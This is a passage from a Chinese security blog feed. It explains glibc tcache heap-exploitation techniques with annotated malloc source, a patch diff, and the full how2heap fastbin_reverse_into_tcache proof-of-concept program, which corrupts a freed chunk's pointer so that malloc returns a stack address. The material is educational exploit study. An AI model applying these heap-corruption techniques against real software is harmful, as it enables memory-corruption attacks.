href="#malloc-源码说明" class="headerlink" title="malloc 源码说明"></a>malloc 源码说明</h2><p>之前说过我们可以通过堆溢出或 UAF 来修改 next 指针，因此问题主要出在 malloc 申请时安全性检查不严格：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes); <span class="comment">//获取对齐后的大小tbytes</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">//获取tc_idx索引</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE (); <span class="comment">//初始化tcache</span></span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">//判断待释放的堆块是否可以放入tcachebin中</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache <span class="comment">//判断tcache是否初始化</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">//对应的tcachebin链表不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">//从tcache中申请chunk</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];  <span class="comment">//获取对应链表的entries（e指向free chunk）</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//tc_idx一定小于TCACHE_MAX_BINS</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>); <span class="comment">//最后插入此tcachebin的free chunk地址一定大于0</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next; <span class="comment">//解链最后进入的free chunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">//counts--</span></span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>; <span class="comment">//设置解链后free chunk的key指针</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的源码看到，在向 tcachebin 申请堆块时几乎没有安全性检查，它连链入 tcachebin 的 free chunk 大小的检查都没有，以下是 fastbin 的在申请时对大小的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">     <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>)) <span class="comment">//大小检查</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="漏洞修补方式"><a href="#漏洞修补方式" class="headerlink" title="漏洞修补方式"></a>漏洞修补方式</h1><p>漏洞修补方式可以在 POC 的注释中可以找到：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619485924588-212d856f-a1ba-4b28-930f-eea147a4ae72.png#clientId=u7e7751a1-2b6c-4&from=drop&id=u67c2c2d9&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-27%2009.11.59.png&originHeight=422&originWidth=1598&originalType=binary&size=114227&status=done&style=none&taskId=udf330ff6-88b9-479b-b3c2-f6dcb9bb106" alt="截屏2021-04-27 09.11.59.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">+  assert (tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在 diff 中可以看到将原有的 assert 的内容替换为对 tcache-&gt;counts[tc_idx]&gt;0 的检查，因为在解链之前 tcache-&gt;counts[tc_idx]总是大于 0 的；然而这种修补方式只能控制我们在篡改 next 指针后申请堆块的次数，并不能控制根本的控制此漏洞的利用方式。<br>总结一下，虽然控制了 malloc 的次数，但是没有从根本上修补 tcache_poisoning 这种攻击方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(2)-fastbin_reverse_into_tcache</title>
    <link href="https://cyberangel.cn/2021/04/23/how2heap(2)-fastbin_reverse_into_tcache/"/>
    <id>https://cyberangel.cn/2021/04/23/how2heap(2)-fastbin_reverse_into_tcache/</id>
    <published>2021-04-23T07:11:57.000Z</published>
    <updated>2021-07-04T09:57:12.266Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在前面的 malloc 源码中我们可以知道，当 fastbin 链表有 free chunk 而对应大小的 tcachebin 链表未满时会将 fastbin 中的 chunk 移动到 fastbin 中。由于 fastbin 和 tcachebin 都是采用 LIFO（后入先出）的机制，因此放入之前和之后 chunk 的顺序正好相反，我们可以使用这一点来控制任意内存。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>加入并开启 tcache 机制的所有 glibc</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="相关的-int-malloc-源码分析"><a href="#相关的-int-malloc-源码分析" class="headerlink" title="相关的_int_malloc 源码分析"></a>相关的_int_malloc 源码分析</h2><p>为了让之后的文章解读更加准确，我们先来回顾一下 fastbin chunk 移入到 tcachebin 中的过程，触发移入要求：</p><ol><li>申请堆块的大小在 fastbin 范围中</li><li>对应大小的 tcachebin 链表为空（因为在申请时 tcachebin 的优先级最高）</li><li>对应大小的 fastbin 链表上有至少两个空闲的 chunk</li><li>在向 fastbin 申请 chunk 后链表上仍然有 free chunk（呼应上一点）</li><li>不能触发任何异常</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))<span class="comment">//要求在fastbin范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);<span class="comment">//获取fastbin索引</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//获取对应main_arena指针</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb; <span class="comment">//获取堆块地址（在链表上没有堆块的情况下victim==0）</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>) <span class="comment">//判断是否有空闲的chunk</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//单线程执行</span></span><br><span class="line">    *fb = victim-&gt;fd; <span class="comment">//取出最后进入fastbin的chunk即victim</span></span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//多线程执行</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim); <span class="comment">//略</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>)) <span class="comment">//主要针对多线程的安全性检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>)) <span class="comment">//检查victim的size是否被恶意篡改</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);<span class="comment">//如篡改则触发异常</span></span><br><span class="line">      check_remalloced_chunk (av, victim, nb); <span class="comment">//一个不太重要但又细致的检查</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="comment">//获取tcachebin索引</span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;<span class="comment">//tcache机制初始化且索引在tcache范围内</span></span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断tcache是否已满</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//判断fastbin链表上是否仍有空闲的chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd; <span class="comment">//单线程执行，对tc_victim开始解链</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123; <span class="comment">//多线程执行</span></span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx); <span class="comment">//向tcachebin放入tc_victim</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p; <span class="comment">//返回申请的victim</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span> <span class="comment">//传入的tc_victim和tc_idx</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk); <span class="comment">//获取free chunk的user data</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//tc_idx一定小于TCACHE_MAX_BINS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache; <span class="comment">//设置tc_victim的key标志位</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx]; <span class="comment">//设置tc_victim的next标志位</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e; <span class="comment">//插入tcachebin</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//对应的计数++</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面两段代码中可以看出：<br>fastbin：chunk1-&gt;chunk2-&gt;chunk3&lt;-0<br>则放入 tcachebin 中：chunk3-&gt;chunk2-&gt;chunk1&lt;-0</p><h2 id="POC-源码分析"><a href="#POC-源码分析" class="headerlink" title="POC 源码分析"></a>POC 源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们需要申请 14 个大小在 fastbin 中的堆块（至于为什么是 14 个之后会说）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123; <span class="comment">//申请14个大小为0x40的堆块</span></span><br><span class="line">  ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们释放掉 7 个堆块让其进入 tcachebin：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1619260706700-96a6a92a-7bf6-42dd-a93b-4505a79d70cc.png#clientId=ucd2717e7-9e51-4&from=drop&id=ua7fd4a9b&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-04-24%2018.38.20.png&originHeight=334&originWidth=1385&originalType=binary&size=41233&status=done&style=none&taskId=u55637fec-fbef-4d5b-8b72-ff1f8b7b8dd" alt="截屏2021-04-24 18.38.20.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>]; <span class="comment">//victim是我们要控制的地方</span></span><br><span class="line"><span class="built_in">free</span>(victim); <span class="comment">//当我们free victim之后其会被放到fastbin中(victim是第一个进入fastbin的堆块)</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 